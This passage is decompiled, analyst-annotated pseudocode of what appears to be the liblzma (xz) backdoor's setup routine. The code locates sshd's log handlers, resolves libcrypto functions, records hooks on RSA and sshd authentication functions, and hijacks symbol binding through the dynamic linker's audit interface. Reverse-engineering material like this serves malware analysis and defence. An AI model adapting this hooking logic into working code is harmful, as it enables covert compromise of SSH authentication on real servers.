    for (loop_idx = 0x16; loop_idx != 0; loop_idx = loop_idx + -1) {
      *(undefined4 *)&insn_ctx_cursor->instruction = 0;
      insn_ctx_cursor = (dasm_ctx_t *)((long)insn_ctx_cursor + (ulong)zero_seed * -8 + 4);
    }
    if ((u8 *)local_980.sshd_string_refs.syslog_bad_level.func_start != (u8 *)0x0) {
      local_b48 = (u8 *)local_980.sshd_string_refs.syslog_bad_level.func_start;
      local_b20 = (log_handler_fn *)0x0;
      addr2 = (log_handler_fn *)0x0;
      do {
        while( TRUE ) {
          if ((local_980.sshd_string_refs.syslog_bad_level.func_end <= local_b48) ||
             ((local_b20 != (log_handler_fn *)0x0 && (addr2 != (log_handler_fn *)0x0))))
          goto LAB_00106bf0;
          bool_result = x86_dasm(&local_a30,local_b48,
                            (u8 *)local_980.sshd_string_refs.syslog_bad_level.func_end);
          if (bool_result != FALSE) break;
          local_b48 = local_b48 + 1;
        }
        if ((*(u32 *)&local_a30.opcode_window[3] & 0xfffffffd) == 0xb1) {
          if (local_a30.prefix.decoded.modrm.breakdown.modrm_mod != '\x03') goto LAB_00106735;
          if ((local_a30.prefix.flags_u16 & 0x1040) == 0) {
            if ((local_a30.prefix.flags_u16 & 0x40) != 0) {
              reg_tmp = 0;
LAB_001067cf:
              reg_upper = local_a30.prefix.decoded.modrm.breakdown.modrm_rm;
              if ((local_a30.prefix.flags_u16 & 0x20) != 0) {
                reg_upper = local_a30.prefix.decoded.modrm.breakdown.modrm_rm | ((byte)local_a30.prefix.decoded.rex & 1) << 3;
              }
              goto LAB_001067ed;
            }
            reg_upper = 0;
          }
          else {
            if ((local_a30.prefix.flags_u16 & 0x40) != 0) {
              reg_tmp = local_a30.prefix.decoded.modrm.breakdown.modrm_reg;
              if ((local_a30.prefix.flags_u16 & 0x20) != 0) {
                reg_tmp = reg_tmp | (char)local_a30.prefix.decoded.rex * '\x02' & 8U;
              }
              goto LAB_001067cf;
            }
            reg_upper = local_a30.prefix.decoded.flags2 & 0x10;
            if ((local_a30.prefix.flags_u16 & 0x1000) == 0) goto LAB_001067fb;
            reg_tmp = local_a30.mov_imm_reg_index;
            if ((local_a30.prefix.flags_u16 & 0x20) != 0) {
              reg_tmp = local_a30.mov_imm_reg_index | ((byte)local_a30.prefix.decoded.rex & 1) << 3;
            }
            reg_upper = 0;
LAB_001067ed:
            if (reg_tmp != reg_upper) goto LAB_00106735;
          }
LAB_001067fb:
          reg_lower = 0;
          log_string_slot = 0;
          addr2 = (log_handler_fn *)0x0;
          insn_ctx_cursor = &local_9d8;
          for (loop_idx = 0x16; loop_idx != 0; loop_idx = loop_idx + -1) {
            *(undefined4 *)&insn_ctx_cursor->instruction = 0;
            insn_ctx_cursor = (dasm_ctx_t *)((long)insn_ctx_cursor + (ulong)zero_seed * -8 + 4);
          }
          addr1 = (log_handler_fn *)0x0;
          sshd_code_end_ptr = local_b48;
          for (; (sshd_code_end_ptr < local_980.sshd_string_refs.syslog_bad_level.func_end && (log_string_slot < 5));
              log_string_slot = log_string_slot + 1) {
            if ((addr1 != (log_handler_fn *)0x0) && (addr2 != (log_handler_fn *)0x0))
            goto LAB_00106b3c;
            bool_result = find_mov_instruction
                               (sshd_code_end_ptr,(u8 *)local_980.sshd_string_refs.syslog_bad_level.func_end,
                                TRUE,FALSE,&local_9d8);
            if (bool_result == FALSE) break;
            if ((local_9d8.prefix.flags_u16 & 0x1040) != 0) {
              if ((local_9d8.prefix.flags_u16 & 0x40) == 0) {
                reg_lower = local_9d8.prefix.decoded.flags2 & 0x10;
                if (((local_9d8.prefix.flags_u16 & 0x1000) != 0) &&
                   (reg_lower = local_9d8.mov_imm_reg_index, (local_9d8.prefix.flags_u16 & 0x20) != 0))
                {
                  reg_tmp = (char)local_9d8.prefix.decoded.rex << 3;
                  goto LAB_001068e4;
                }
              }
              else {
                reg_lower = local_9d8.prefix.decoded.modrm.breakdown.modrm_reg;
                if ((local_9d8.prefix.flags_u16 & 0x20) != 0) {
                  reg_tmp = (char)local_9d8.prefix.decoded.rex * '\x02';
LAB_001068e4:
                  reg_lower = reg_lower | reg_tmp & 8;
                }
              }
            }
            pplVar46 = addr2;
            if ((reg_upper == reg_lower) && ((local_9d8.prefix.flags_u16 & 0x100) != 0)) {
              pplVar48 = (log_handler_fn *)local_9d8.mem_disp;
              if (((uint)local_9d8.prefix.decoded.modrm & 0xff00ff00) == 0x5000000) {
                pplVar48 = (log_handler_fn *)
                           ((u8 *)(local_9d8.mem_disp + (long)local_9d8.instruction) +
                           CONCAT44(*(uint *)((u8 *)&local_9d8.instruction_size + 4),
                                    (undefined4)local_9d8.instruction_size));
              }
              local_a90 = 0;
              pplVar45 = (log_handler_fn *)
                         elf_get_data_segment(&local_980.main_info,&local_a90,FALSE);
              if ((((pplVar45 == (log_handler_fn *)0x0) ||
                   ((log_handler_fn *)(local_a90 + (long)pplVar45) <= pplVar48)) ||
                  (pplVar48 < pplVar45)) ||
                 (((pplVar48 == addr2 && (pplVar48 == addr1)) ||
                  (pplVar46 = pplVar48, addr1 != (log_handler_fn *)0x0)))) goto LAB_00106997;
            }
            else {
LAB_00106997:
              pplVar48 = addr1;
              addr2 = pplVar46;
            }
            sshd_code_end_ptr = local_9d8.instruction +
                      CONCAT44(*(uint *)((u8 *)&local_9d8.instruction_size + 4),
                               (undefined4)local_9d8.instruction_size);
            addr1 = pplVar48;
          }
          if ((addr1 == (log_handler_fn *)0x0) || (addr2 == (log_handler_fn *)0x0)) {
LAB_00106ab1:
            addr2 = (log_handler_fn *)0x0;
            local_b20 = (log_handler_fn *)0x0;
          }
          else {
LAB_00106b3c:
            bool_result = validate_log_handler_pointers
                               (addr1,addr2,code_segment,(u8 *)((long)code_segment + signed_data_size),
                                &local_980.sshd_string_refs,ctx);
            local_b20 = addr1;
            if (bool_result != FALSE) {
              sshd_log_ctx->log_handler_slot = addr1;
              libcrypto_info = &local_980.main_info;
              sshd_log_ctx->log_handler_ctx_slot = addr2;
              sshd_log_ctx->handler_slots_valid = TRUE;
              local_9d8.instruction = (u8 *)CONCAT44(*(uint *)((u8 *)&local_9d8.instruction + 4),0x708);
              string_cursor = elf_find_string(libcrypto_info,(EncodedStringId *)&local_9d8,(void *)0x0);
              sshd_log_ctx->fmt_percent_s = string_cursor;
              if (string_cursor != (char *)0x0) {
                local_9d8.instruction = (u8 *)CONCAT44(*(uint *)((u8 *)&local_9d8.instruction + 4),0x790);
                string_cursor = elf_find_string(libcrypto_info,(EncodedStringId *)&local_9d8,(void *)0x0);
                sshd_log_ctx->str_connection_closed_by = string_cursor;
                if (string_cursor != (char *)0x0) {
                  local_9d8.instruction = (u8 *)CONCAT44(*(uint *)((u8 *)&local_9d8.instruction + 4),0x4f0);
                  string_cursor = elf_find_string(libcrypto_info,(EncodedStringId *)&local_9d8,(void *)0x0);
                  sshd_log_ctx->str_preauth = string_cursor;
                  if (string_cursor != (char *)0x0) {
                    local_9d8.instruction = (u8 *)CONCAT44(*(uint *)((u8 *)&local_9d8.instruction + 4),0x1d8);
                    string_cursor = elf_find_string(libcrypto_info,(EncodedStringId *)&local_9d8,(void *)0x0);
                    sshd_log_ctx->str_authenticating = string_cursor;
                    if (string_cursor != (char *)0x0) {
                      local_9d8.instruction = (u8 *)CONCAT44(*(uint *)((u8 *)&local_9d8.instruction + 4),0xb10);
                      string_cursor = elf_find_string(libcrypto_info,(EncodedStringId *)&local_9d8,(void *)0x0);
                      sshd_log_ctx->str_user = string_cursor;
                      if (string_cursor != (char *)0x0) break;
                    }
                  }
                }
              }
              sshd_log_ctx->log_squelched = TRUE;
              break;
            }
          }
        }
        else if ((((*(u32 *)&local_a30.opcode_window[3] == 0x147) &&
                  ((uint)local_a30.prefix.decoded.modrm >> 8 == 0x50000)) &&
                 ((local_a30.prefix.flags_u16 & 0x800) != 0)) && (local_a30.imm_zeroextended == 0))
        {
          addr1 = (log_handler_fn *)0x0;
          if ((local_a30.prefix.flags_u16 & 0x100) != 0) {
            addr1 = (log_handler_fn *)
                    (local_a30.instruction + local_a30.instruction_size + local_a30.mem_disp);
          }
          local_9d8.instruction = (u8 *)0x0;
          pplVar46 = (log_handler_fn *)
                     elf_get_data_segment(&local_980.main_info,(u64 *)&local_9d8,FALSE);
          if (((pplVar46 != (log_handler_fn *)0x0) &&
              (addr1 < local_9d8.instruction + (long)pplVar46)) && (pplVar46 <= addr1)) {
            insn_ctx_cursor = &local_9d8;
            for (loop_idx = 0x16; sshd_code_end_ptr = local_b48, loop_idx != 0; loop_idx = loop_idx + -1) {
              *(undefined4 *)&insn_ctx_cursor->instruction = 0;
              insn_ctx_cursor = (dasm_ctx_t *)((long)insn_ctx_cursor + (ulong)zero_seed * -8 + 4);
            }
            do {
              bool_result = find_instruction_with_mem_operand_ex
                                 (sshd_code_end_ptr,(u8 *)local_980.sshd_string_refs.syslog_bad_level.func_end
                                  ,&local_9d8,0x147,(void *)0x0);
              if (bool_result == FALSE) break;
              if ((local_9d8.imm_zeroextended == 0) && ((local_9d8.prefix.flags_u16 & 0x100) != 0))
              {
                addr2 = (log_handler_fn *)local_9d8.mem_disp;
                if (((uint)local_9d8.prefix.decoded.modrm & 0xff00ff00) == 0x5000000) {
                  addr2 = (log_handler_fn *)
                          ((u8 *)(local_9d8.mem_disp + (long)local_9d8.instruction) +
                          CONCAT44(*(uint *)((u8 *)&local_9d8.instruction_size + 4),
                                   (undefined4)local_9d8.instruction_size));
                }
                local_a90 = 0;
                pplVar46 = (log_handler_fn *)
                           elf_get_data_segment(&local_980.main_info,&local_a90,FALSE);
                if ((((pplVar46 != (log_handler_fn *)0x0) &&
                     (addr2 < (log_handler_fn *)(local_a90 + (long)pplVar46))) &&
                    (pplVar46 <= addr2)) && (addr1 != addr2)) goto LAB_00106b3c;
              }
              sshd_code_end_ptr = local_9d8.instruction +
                        CONCAT44(*(uint *)((u8 *)&local_9d8.instruction_size + 4),
                                 (undefined4)local_9d8.instruction_size);
            } while (local_9d8.instruction +
                     CONCAT44(*(uint *)((u8 *)&local_9d8.instruction_size + 4),
                              (undefined4)local_9d8.instruction_size) <
                     local_980.sshd_string_refs.syslog_bad_level.func_end);
            goto LAB_00106ab1;
          }
        }
LAB_00106735:
        local_b48 = local_b48 + local_a30.instruction_size;
      } while( TRUE );
    }
  }
LAB_00106bf0:
  libcrypto_allocator->opaque = local_980.elf_handles.libcrypto;
  if (bn_bin2bn_sym != (Elf64_Sym *)0x0) {
    libcrypto_sym_offset = bn_bin2bn_sym->st_value;
    libcrypto_ehdr = (local_980.elf_handles.libcrypto)->elfbase;
    resolved_count_ptr = &(local_b10->imported_funcs).resolved_imports_count;
    *resolved_count_ptr = *resolved_count_ptr + 1;
    (local_b10->imported_funcs).EVP_DecryptUpdate =
         (pfn_EVP_DecryptUpdate_t)(libcrypto_ehdr->e_ident + libcrypto_sym_offset);
  }
  if (bn_dup_sym != (Elf64_Sym *)0x0) {
    libcrypto_sym_offset = bn_dup_sym->st_value;
    libcrypto_ehdr = (local_980.elf_handles.libcrypto)->elfbase;
    resolved_count_ptr = &(local_b10->imported_funcs).resolved_imports_count;
    *resolved_count_ptr = *resolved_count_ptr + 1;
    (local_b10->imported_funcs).EVP_DecryptFinal_ex =
         (pfn_EVP_DecryptFinal_ex_t)(libcrypto_ehdr->e_ident + libcrypto_sym_offset);
  }
  bool_result = init_imported_funcs(imported_funcs);
  if (((((((bool_result != FALSE) &&
          (lzma_free((local_b10->imported_funcs).EVP_MD_CTX_new,libcrypto_allocator),
          (local_b10->libc_imports).resolved_imports_count == 0xc)) &&
         (bool_result = secret_data_append_from_address
                             ((void *)0x1,(secret_data_shift_cursor_t)0x145,0x78,0x18),
         bool_result != FALSE)) &&
        ((bool_result = secret_data_append_from_address
                             (params->hook_ctx->symbind64_trampoline,
                              (secret_data_shift_cursor_t)0x12a,4,0x12), bool_result != FALSE &&
         (bool_result = secret_data_append_item
                             ((secret_data_shift_cursor_t)0x12e,0x13,4,0x20,
                              (u8 *)params->hook_ctx->rsa_public_decrypt_entry), bool_result != FALSE))))
       && (bool_result = secret_data_append_from_address
                              (params->shared_globals->evp_set1_rsa_hook_entry,
                               (secret_data_shift_cursor_t)0x132,6,0x14), bool_result != FALSE)) &&
      ((bool_result = secret_data_append_item
                           ((secret_data_shift_cursor_t)0x138,0x15,2,0x10,
                            (u8 *)params->hook_ctx->rsa_get0_key_entry), bool_result != FALSE &&
       (bool_result = secret_data_append_item
                           ((secret_data_shift_cursor_t)0xee,0x10,0x26,0x20,
                            (u8 *)params->hook_ctx->mm_answer_keyallowed_entry), bool_result != FALSE))))
     && ((bool_result = secret_data_append_item
                             ((secret_data_shift_cursor_t)0x140,0x17,5,0x20,
                              (u8 *)params->hook_ctx->mm_answer_keyverify_entry), bool_result != FALSE &&
         (((bool_result = secret_data_append_item
                               ((secret_data_shift_cursor_t)0x13a,0x16,6,0x20,
                                (u8 *)params->shared_globals->authpassword_hook_entry),
           bool_result != FALSE &&
           (bool_result = secret_data_append_item
                               ((secret_data_shift_cursor_t)0x114,0x11,0x16,0x10,
                                (u8 *)elf_functions_table->elf_parse), bool_result != FALSE)) &&
          ((local_b10->global_ctx).secret_bits_filled == 0x1c8)))))) {
    *(local_b10->ldso_ctx).libcrypto_l_name = (char *)local_b10;
    local_980.sshd_link_map = local_980.sshd_link_map + local_ac8 + 8;
    resolver_status = *(u32 *)local_980.sshd_link_map;
    (local_b10->ldso_ctx).sshd_auditstate_bindflags_ptr = (u32 *)local_980.sshd_link_map;
    (local_b10->ldso_ctx).sshd_auditstate_bindflags_old_value = resolver_status;
    *(u32 *)local_980.sshd_link_map = 2;
    hook_table_bytes = (byte *)(local_b10->ldso_ctx).sshd_link_map_l_audit_any_plt_addr;
    *hook_table_bytes = *hook_table_bytes | (local_b10->ldso_ctx).link_map_l_audit_any_plt_bitmask;
    local_980.libcrypto_link_map = local_980.libcrypto_link_map + local_ac8 + 8;
    resolver_status = *(u32 *)local_980.libcrypto_link_map;
    (local_b10->ldso_ctx).libcrypto_auditstate_bindflags_ptr = (u32 *)local_980.libcrypto_link_map;
    (local_b10->ldso_ctx).libcrypto_auditstate_bindflags_old_value = resolver_status;
    audit_ifaces_ptr = &(local_b10->ldso_ctx).hooked_audit_ifaces;
    *(u32 *)local_980.libcrypto_link_map = 1;
    audit_ifaces_ptr = audit_ifaces_ptr;
    for (loop_idx = 0x1e; loop_idx != 0; loop_idx = loop_idx + -1) {
      *(undefined4 *)&audit_ifaces_ptr->activity = 0;
      audit_ifaces_ptr = (audit_ifaces *)((long)audit_ifaces_ptr + (ulong)zero_seed * -8 + 4);
    }
    (local_b10->ldso_ctx).hooked_audit_ifaces.symbind =
         (audit_symbind_fn_t)params->hook_ctx->symbind64_trampoline;
    *(local_b10->ldso_ctx)._dl_audit_ptr = audit_ifaces_ptr;
    *(local_b10->ldso_ctx)._dl_naudit_ptr = 1;
    loop_idx = 0;
    libc_allocator = local_980.active_lzma_allocator;
    while (libc_allocator != (lzma_allocator *)0x0) {
      *(undefined1 *)((long)&(local_980.active_lzma_allocator)->alloc + loop_idx) =
           *(undefined1 *)((long)&local_980.saved_lzma_allocator.alloc + loop_idx);
      libc_allocator = (lzma_allocator *)(loop_idx + -0x17);
      loop_idx = loop_idx + 1;
    }
    goto LAB_00105a81;
  }
LAB_00105a60:
  libc_allocator = &local_980.saved_lzma_allocator;
  init_ldso_ctx(&local_b10->ldso_ctx);
  loop_idx = 0;
  libcrypto_allocator = local_980.active_lzma_allocator;
  while (libcrypto_allocator != (lzma_allocator *)0x0) {
    *(undefined1 *)((long)&(local_980.active_lzma_allocator)->alloc + loop_idx) =
         *(undefined1 *)((long)&libc_allocator->alloc + loop_idx);
    libcrypto_allocator = (lzma_allocator *)(loop_idx + -0x17);
    loop_idx = loop_idx + 1;
  }
LAB_00105a81:
  entry_ctx = params->entry_ctx;
  (entry_ctx->got_ctx).tls_got_entry = (void *)0x0;
  (entry_ctx->got_ctx).cpuid_got_slot = (void *)0x0;
  (entry_ctx->got_ctx).cpuid_slot_index = 0;
  (entry_ctx->got_ctx).got_base_offset = 0;
  entry_ctx->cpuid_random_symbol_addr = (void *)0x1;
  int_ptr = (int *)cpuid_basic_info(0);
  if (*int_ptr != 0) {
    resolved_count_cursor = (undefined4 *)cpuid_Version_info(1);
    resolved_mask0 = resolved_count_cursor[1];
    resolved_mask1 = resolved_count_cursor[2];
    resolved_mask2 = resolved_count_cursor[3];
    *(undefined4 *)&(entry_ctx->got_ctx).tls_got_entry = *resolved_count_cursor;
    *(undefined4 *)&(entry_ctx->got_ctx).cpuid_got_slot = resolved_mask0;
    *(undefined4 *)&(entry_ctx->got_ctx).cpuid_slot_index = resolved_mask2;
    *(undefined4 *)&(entry_ctx->got_ctx).got_base_offset = resolved_mask1;
  }
  return FALSE;
}

